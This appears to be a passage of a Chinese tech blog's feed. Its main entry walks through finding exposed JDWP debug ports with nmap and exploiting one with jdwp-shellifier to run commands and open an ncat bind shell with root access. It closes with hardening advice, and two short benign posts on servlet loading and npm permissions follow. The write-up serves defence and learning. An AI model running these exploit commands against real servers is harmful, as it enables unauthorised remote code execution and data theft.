title="端口明明开了，却没有扫描到？"></a>端口明明开了，却没有扫描到？</h3><p>nmap默认只扫描每个协议常见的1000个端口，如果你的端口不在里面，默认就不会扫描。</p><blockquote><p><a href="https://nmap.org/book/man-port-specification.html" rel="external nofollow noopener noreferrer" target="_blank">Nmap scans the most common 1,000 ports for each protocol</a>. If your port is not in that list, it won’t be scanned. </p></blockquote><p>端口使用的频率存储在<code>nmap-services</code>文件中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) locate nmap-services</span><br><span class="line">/usr/<span class="built_in">local</span>/Cellar/nmap/7.70/share/nmap/nmap-services</span><br></pre></td></tr></table></figure><p>可以直接查看这个文件， 也可以使用下面的命令查看对应的频率：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) sudo nmap -v -oG - -sSU</span><br><span class="line">Password:</span><br><span class="line"># Nmap 7.70 scan initiated Fri Aug 10 13:46:47 2018 as: nmap -v -oG - -sSU</span><br><span class="line"># Ports scanned: TCP(1000;1,3-4,6-7,9,13,17,19-26,30,32-33,37,42-43,49,53,70,79-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,443-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521...省略</span><br></pre></td></tr></table></figure><p>具体说明参见： <a href="https://secwiki.org/w/FAQ_missing_port" rel="external nofollow noopener noreferrer" target="_blank">FAQ missing port - SecWiki</a></p><p>解决方案：</p><p><code>nmap</code>中可以通过<code>-p</code>指定扫描的端口范围：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  sudo nmap -sV 221.221.221.221  -p 1-65535</span><br><span class="line">Password:</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-10 12:26 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> izbp16k6k2yv9vvh6c3v65zi (221.221.221.221)</span><br><span class="line">Host is up (0.035s latency).</span><br><span class="line">Not shown: 65464 closed ports</span><br><span class="line">PORT      STATE    SERVICE        VERSION</span><br><span class="line">22/tcp    open     ssh            OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">42/tcp    filtered nameserver</span><br><span class="line">80/tcp    open     http           nginx 1.10.2</span><br><span class="line">111/tcp   open     rpcbind        2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">135/tcp   filtered msrpc</span><br><span class="line">136/tcp   filtered profile</span><br><span class="line">137/tcp   filtered netbios-ns</span><br><span class="line">138/tcp   filtered netbios-dgm</span><br><span class="line">139/tcp   filtered netbios-ssn</span><br><span class="line">443/tcp   open     ssl/http       nginx 1.10.2</span><br><span class="line">445/tcp   filtered microsoft-ds</span><br><span class="line">593/tcp   filtered http-rpc-epmap</span><br><span class="line">901/tcp   filtered samba-swat</span><br><span class="line">1068/tcp  filtered instl_bootc</span><br><span class="line">2745/tcp  filtered urbisnet</span><br><span class="line">3127/tcp  filtered ctx-bridge</span><br><span class="line">3128/tcp  filtered squid-http</span><br><span class="line">3333/tcp  filtered dec-notes</span><br><span class="line">3690/tcp  open     svnserve       Subversion</span><br><span class="line">3691/tcp  open     svnserve       Subversion</span><br><span class="line">4444/tcp  filtered krb524</span><br><span class="line">4999/tcp  open     http           Apache httpd 2.4.10 ((Debian))</span><br><span class="line">5554/tcp  filtered sgi-esphttp</span><br><span class="line">5800/tcp  filtered vnc-http</span><br><span class="line">5900/tcp  filtered vnc</span><br><span class="line">6129/tcp  filtered unknown</span><br><span class="line">6176/tcp  filtered unknown</span><br><span class="line">6379/tcp  open     redis          Redis key-value store</span><br><span class="line">6667/tcp  filtered irc</span><br><span class="line">7070/tcp  open     http           nginx 1.10.3</span><br><span class="line">8076/tcp  open     http           Apache Tomcat 8.5.13</span><br><span class="line">8081/tcp  open     http           Apache Tomcat 8.5.13</span><br><span class="line">8146/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8180/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8181/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8183/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8188/tcp  open     unknown</span><br><span class="line">8189/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8280/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8283/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">8380/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8399/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">8694/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8967/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">8998/tcp  filtered canto-roboflow</span><br><span class="line">9001/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9011/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9058/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">9060/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_171</span><br><span class="line">9260/tcp  open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">9928/tcp  open     http           Jetty 9.2.24.v20180105</span><br><span class="line">9988/tcp  open     http           Jetty 9.2.24.v20180105</span><br><span class="line">9990/tcp  open     http           Jetty 9.4.7.v20170914</span><br><span class="line">9991/tcp  open     http           Jetty 9.4.8.v20171121</span><br><span class="line">9996/tcp  filtered palace-5</span><br><span class="line">9997/tcp  open     http           Jetty 9.4.8.v20171121</span><br><span class="line">9998/tcp  open     http           Jetty 9.4.7.v20170914</span><br><span class="line">9999/tcp  open     http           Jetty 9.2.24.v20180105</span><br><span class="line">10010/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">10018/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">11114/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_171</span><br><span class="line">11211/tcp open     memcached      Memcached 1.4.34 (uptime 20219548 seconds)</span><br><span class="line">12001/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">12003/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">13001/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">13003/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">14002/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">15001/tcp open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">18694/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line">19998/tcp open     http           Jetty 9.4.7.v20170914</span><br><span class="line">29998/tcp open     http           Jetty 9.4.7.v20170914</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 87.05 seconds</span><br></pre></td></tr></table></figure><p>上面是dev机器上开启的端口， <code>Java Debug Wire Protocol (Reference Implementation)</code>就是开启了<code>JDWP</code>的机器。</p><h2 id="二次确认"><a href="#二次确认" class="headerlink" title="二次确认"></a>二次确认</h2><blockquote><p>telnet端口后，输入命令JDWP-Handshake<br>如果返回JDWP-Handshake，证明存在漏洞。</p></blockquote><p>可以用下面的命令测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) &#123; <span class="built_in">echo</span> <span class="string">"JDWP-Handshake"</span>; sleep 20 &#125; | telnet 221.221.221.221 10010</span><br><span class="line">Trying 221.221.221.221...</span><br><span class="line">Connected to izbp16k6k2yv9vvh6c3v65zi.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br><span class="line">JDWP-Handshake</span><br></pre></td></tr></table></figure><p>或者使用<code>nc</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) &#123; <span class="built_in">echo</span> <span class="string">"JDWP-Handshake"</span>; sleep 1 | <span class="built_in">trap</span> <span class="built_in">exit</span> INT&#125; | nc 221.221.221.221 10010</span><br><span class="line">JDWP-Handshake</span><br></pre></td></tr></table></figure><h1 id="漏洞利用实战"><a href="#漏洞利用实战" class="headerlink" title="漏洞利用实战"></a>漏洞利用实战</h1><h2 id="确定debug的端口"><a href="#确定debug的端口" class="headerlink" title="确定debug的端口"></a>确定debug的端口</h2><p>通过<code>nmap</code>确定debug的端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">18694/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation)</span><br></pre></td></tr></table></figure><h2 id="nmap执行命令"><a href="#nmap执行命令" class="headerlink" title="nmap执行命令"></a>nmap执行命令</h2><p><a href="https://nmap.org/nsedoc/scripts/jdwp-exec.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-exec NSE Script</a></p><p><a href="https://nmap.org/nsedoc/scripts/jdwp-info.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-info NSE Script</a></p><p><a href="https://nmap.org/nsedoc/scripts/jdwp-inject.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-inject NSE Script</a></p><blockquote><p>这种方式没有实验成功，有兴趣的同学可以试一试</p></blockquote><ul><li>Example Usage</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT &lt;target&gt; -p &lt;port&gt; --script=+jdwp-exec --script-args cmd=&quot;date&quot;</span><br></pre></td></tr></table></figure><ul><li>Script Output</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE REASON</span><br><span class="line">2010/tcp open  search  syn-ack</span><br><span class="line">| jdwp-exec:</span><br><span class="line">|   date output:</span><br><span class="line">|   Sat Aug 11 15:27:21 Central European Daylight Time 2012</span><br><span class="line">|_</span><br></pre></td></tr></table></figure><h2 id="开源脚本"><a href="#开源脚本" class="headerlink" title="开源脚本"></a>开源脚本</h2><p><a href="https://github.com/IOActive/jdwp-shellifier" rel="external nofollow noopener noreferrer" target="_blank">IOActive/jdwp-shellifier</a></p><p>使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) python jdwp-shellifier.py -t 221.221.221.221 -p 10010  --<span class="built_in">break</span>-on <span class="string">"java.lang.String.indexOf"</span>  --cmd <span class="string">"touch /home/777"</span></span><br><span class="line">[+] Targeting <span class="string">'221.221.221.221:10010'</span></span><br><span class="line">[+] Reading settings <span class="keyword">for</span> <span class="string">'Java HotSpot(TM) 64-Bit Server VM - 1.8.0_121'</span></span><br><span class="line">[+] Found Runtime class: id=346d</span><br><span class="line">[+] Found Runtime.getRuntime(): id=7fd8f420b170</span><br><span class="line">[+] Created <span class="built_in">break</span> event id=2</span><br><span class="line">[+] Waiting <span class="keyword">for</span> an event on <span class="string">'java.lang.String.indexOf'</span></span><br><span class="line">[+] Received matching event from thread 0x355c</span><br><span class="line">[+] Selected payload <span class="string">'touch /home/777'</span></span><br><span class="line">[+] Command string object created id:355d</span><br><span class="line">[+] Runtime.getRuntime() returned context id:0x355e</span><br><span class="line">[+] found Runtime.exec(): id=7fd8f40140f0</span><br><span class="line">[+] Runtime.exec() successful, retId=355f</span><br><span class="line">[!] Command successfully executed</span><br></pre></td></tr></table></figure><p><code>break-on &quot;java.lang.String.indexOf&quot;</code>表示在这个函数打断点，当这个函数执行的时候， 后面跟着的命令就会执行，这时我们登录上机器查看下执行的结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@yd-dev-api server]<span class="comment"># ls -alh  /home</span></span><br><span class="line">总用量 52K</span><br><span class="line">drwxr-xr-x. 13 root          root          4.0K 8月  10 14:12 .</span><br><span class="line">dr-xr-xr-x. 28 root          root          4.0K 7月  19 17:52 ..</span><br><span class="line">-rw-r--r--   1 root          root             0 8月  10 14:12 777</span><br></pre></td></tr></table></figure><p>可以看到<code>777</code>这个文件已经创建了， 时间正好是我们执行命令的时间。</p><p>这只是初级玩法， 脚本的示例给的是启动一个<code>ncat</code>的程序， 然后就可以远程连接上这个ncat开启的端口，相当于有一个<code>root</code>权限的shell了。</p><p>安装<code>ncat</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t 221.221.221.221 -p 8399  --break-on &quot;java.lang.String.indexOf&quot;  --cmd  &quot;sudo yum install -y nc&quot;</span><br></pre></td></tr></table></figure><p><code>ncat</code>在服务器上开启一个端口， 转发输入交给<code>bash</code>去执行。</p><p>开启转发服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) python jdwp-shellifier.py -t 221.221.221.221 -p 8399  --<span class="built_in">break</span>-on <span class="string">"java.lang.String.indexOf"</span>  --cmd  <span class="string">"ncat -v -l -p 7777 -e /bin/bash"</span></span><br><span class="line">[+] Targeting <span class="string">'221.221.221.221:8399'</span></span><br><span class="line">[+] Reading settings <span class="keyword">for</span> <span class="string">'Java HotSpot(TM) 64-Bit Server VM - 1.8.0_121'</span></span><br><span class="line">[+] Found Runtime class: id=345e</span><br><span class="line">[+] Found Runtime.getRuntime(): id=7f6420023408</span><br><span class="line">[+] Created <span class="built_in">break</span> event id=2</span><br><span class="line">[+] Waiting <span class="keyword">for</span> an event on <span class="string">'java.lang.String.indexOf'</span></span><br><span class="line">[+] Received matching event from thread 0x354e</span><br><span class="line">[+] Selected payload <span class="string">'ncat -v -l -p 7777 -e /bin/bash'</span></span><br><span class="line">[+] Command string object created id:354f</span><br><span class="line">[+] Runtime.getRuntime() returned context id:0x3550</span><br><span class="line">[+] found Runtime.exec(): id=7f6420023468</span><br><span class="line">[+] Runtime.exec() successful, retId=3551</span><br><span class="line">[!] Command successfully executed</span><br></pre></td></tr></table></figure><p>服务器上端口已经开启：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@yd-dev-api server]# sudo lsof -i:7777</span><br><span class="line">COMMAND  PID USER   FD   TYPE    DEVICE SIZE/OFF NODE NAME</span><br><span class="line">ncat    7617 root    3u  IPv6 292856080      0t0  TCP *:cbt (LISTEN)</span><br><span class="line">ncat    7617 root    4u  IPv4 292856081      0t0  TCP *:cbt (LISTEN)</span><br></pre></td></tr></table></figure><p>连接上去：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) nc 221.221.221.221 7777</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/root</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">ls -alh</span><br><span class="line">total 218M</span><br><span class="line">dr-xr-x---. 18 root root 4.0K Aug 10 11:05 .</span><br><span class="line">dr-xr-xr-x. 28 root root 4.0K Jul 19 17:52 ..</span><br><span class="line">-rw-r--r--   1 root root   26 May 11 13:57 12.txt</span><br><span class="line">-rwxr-xr-x   1 root root 1.7K Jan 30  2018 214468302700277.key</span><br><span class="line">-rwxr-xr-x   1 root root 3.3K Jan 30  2018 214468302700277.pem</span><br></pre></td></tr></table></figure><h1 id="远程调试的建议"><a href="#远程调试的建议" class="headerlink" title="远程调试的建议"></a>远程调试的建议</h1><p>一、线上不能开启debug，对服务器性能有影响。</p><p>二、关闭对外远程debug的端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo lsof -i:&lt;port&gt;</span><br></pre></td></tr></table></figure><p>查找到对应的进程， 然后修改配置，<strong>重启tomcat</strong></p><p>三、远程debug步骤：</p><ol><li><p>tomcat 开启调试: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CATALINA_OPTS=<span class="string">"-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=127.0.0.1:8399"</span></span><br></pre></td></tr></table></figure><p><strong>注意必须绑定到127.0.0.1</strong></p></li><li><p>安装socat</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y socat</span><br></pre></td></tr></table></figure></li><li><p>服务器安装socat进行转发:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:5005forkrange=0.0.0.0/32 TCP4:127.0.0.1:8399 | hostname -i</span><br></pre></td></tr></table></figure><p>其中<code>0.0.0.0/32</code>表示放开ip限制（不是内网没有办法限制出口ip)， <strong>命令不要在后台执行</strong>，否则跟开启了对外的远程debug没有区别</p></li><li><p>idea中新建Remote配置，host写上面输出的公网的ip， 端口写5005</p></li></ol><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><ul><li>远程调试端口的地址一定要绑定到<code>127.0.0.1</code></li><li>tomcat用单独的组的用户启动（这个组的权限要设置到较低）</li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://www.ibm.com/developerworks/cn/java/j-lo-jpda1/index.html?ca=drs-" rel="external nofollow noopener noreferrer" target="_blank">深入 Java 调试体系: 第 1 部分，JPDA 体系概览</a></li><li><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html" rel="external nofollow noopener noreferrer" target="_blank">Java Platform Debugger Architecture</a></li><li><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/jpda/jdwp-spec.html" rel="external nofollow noopener noreferrer" target="_blank">Java(tm) Debug Wire Protocol</a></li><li><a href="http://files.meetup.com/3189882/Java%20Debugger%20Internals.pdf" rel="external nofollow noopener noreferrer" target="_blank">Java Debugger Internals - Meetup</a></li><li><a href="https://_thorns.gitbooks.io/sec/content/java_debug_remote_code_execution.html" rel="external nofollow noopener noreferrer" target="_blank">Java Debug Remote Code Execution · 安全手册</a></li><li><a href="https://secwiki.org/w/FAQ_missing_port" rel="external nofollow noopener noreferrer" target="_blank">FAQ missing port - SecWiki</a></li><li><a href="https://github.com/IOActive/jdwp-shellifier" rel="external nofollow noopener noreferrer" target="_blank">IOActive/jdwp-shellifier</a></li><li><a href="https://ioactive.com/hacking-java-debug-wire-protocol-or-how/" rel="external nofollow noopener noreferrer" target="_blank">Hacking the Java Debug Wire Protocol - or - “How I met your Java debugger” | IOActive</a></li><li><a href="https://nmap.org/nsedoc/scripts/jdwp-exec.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-exec NSE Script</a></li><li><a href="https://nmap.org/nsedoc/scripts/jdwp-info.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-info NSE Script</a></li><li><a href="https://nmap.org/nsedoc/scripts/jdwp-inject.html" rel="external nofollow noopener noreferrer" target="_blank">jdwp-inject NSE Script</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;什么是JDWP？&quot;&gt;&lt;a href=&quot;#什么是JDWP？&quot; class=&quot;headerlink&quot; title=&quot;什么是JDWP？&quot;&gt;&lt;/a&gt;什么是JDWP？&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;JDWP（Java Debug Wire Protocol）是一个
      
    
    </summary>
    
      <category term="jvm" scheme="http://qsli.github.io/categories/jvm/"/>
    
    
      <category term="jdwp" scheme="http://qsli.github.io/tags/jdwp/"/>
    
  </entry>
  
  <entry>
    <title>web.xml</title>
    <link href="http://qsli.github.io/2018/08/11/web-xml/"/>
    <id>http://qsli.github.io/2018/08/11/web-xml/</id>
    <published>2018-08-11T12:42:43.012Z</published>
    <updated>2018-08-11T12:42:43.030Z</updated>
    
    <content type="html"><![CDATA[<h2 id="load-on-startup标签"><a href="#load-on-startup标签" class="headerlink" title="load-on-startup标签"></a>load-on-startup标签</h2><blockquote><p>Servlets are initialized either lazily at request processing time or eagerly during<br>deployment. In the latter case, they are initialized in the order indicated by<br>their load-on-startup elements.</p></blockquote><p>在web容器启动的时候，可以采用<code>lazily</code>加载的方式和<code>eagerly</code>的方式。</p><p><code>load-on-startup</code>中的值决定了进行哪种方式。</p><blockquote><p>If the value is a negative integer, or the element is not present, the<br>container is free to load the servlet whenever it chooses. If the value is a positive<br>integer or 0, the container must load and initialize the servlet as the application is<br>deployed.</p></blockquote><p>如果<load-on-startup>这个元素没有出现，或者出现了但是里面的值是负的，容器可以按照自己的需要选择加载Servlet的时机。</load-on-startup></p><p>如果里面的值是正数或者0，容器必须保证在容器启动的时候加载和初始化这个servlet</p><blockquote><p> The container must guarantee that servlets marked with lower integers<br>are loaded before servlets marked with higher integers.</p></blockquote><p>这个值越小，优先级越高，容器优先加载。</p><blockquote><p>The container may choose<br>the order of loading of servlets with the same load-on-startup value.</p></blockquote><p>如果里面的值是一样的，那么加载的顺序由容器来决定（不同实现可能不同）</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li>Java Servlet Specification 3.0</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;load-on-startup标签&quot;&gt;&lt;a href=&quot;#load-on-startup标签&quot; class=&quot;headerlink&quot; title=&quot;load-on-startup标签&quot;&gt;&lt;/a&gt;load-on-startup标签&lt;/h2&gt;&lt;blockquote&gt;

      
    
    </summary>
    
      <category term="tomcat" scheme="http://qsli.github.io/categories/tomcat/"/>
    
    
      <category term="servlet" scheme="http://qsli.github.io/tags/servlet/"/>
    
  </entry>
  
  <entry>
    <title>hexo迁移到ubuntu</title>
    <link href="http://qsli.github.io/2018/08/11/hexo-ubuntu/"/>
    <id>http://qsli.github.io/2018/08/11/hexo-ubuntu/</id>
    <published>2018-08-11T12:42:41.640Z</published>
    <updated>2018-08-11T12:42:41.640Z</updated>
    
    <content type="html"><![CDATA[<p>系统切换到ubuntu之后，使用的apt安装的node，默认权限是sudo。安装hexo之后也必须以sudo身份执行。<br>需要修改下node的权限，命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  qsli.github.com (hexo|✚1…)  npm config get prefix</span><br><span class="line">/usr/local</span><br></pre></td></tr></table></figure><p>修改owner</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chown -R $(whoami) $(npm config get prefix)/&#123;lib/node_modules,bin,share&#125;</span><br></pre></td></tr></table></figure><p>修改owner之后就可以正常执行hexo了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://docs.npmjs.com/getting-started/fixing-npm-permissions" rel="external nofollow noopener noreferrer" target="_blank">03 - Fixing npm permissions | npm Documentation</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;系统切换到ubuntu之后，使用的apt安装的node，默认权限是sudo。安装hexo之后也必须以sudo身份执行。&lt;br&gt;需要修改下node的权限，命令如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td clas
      
    
    </summary>
    
      <category term="hexo" scheme="http://qsli.github.io/categories/hexo/"/>
    
    
      <category term="hexo" scheme="http://qsli.github.io/tags/hexo/"/>
    
  </entry>
  
</feed>
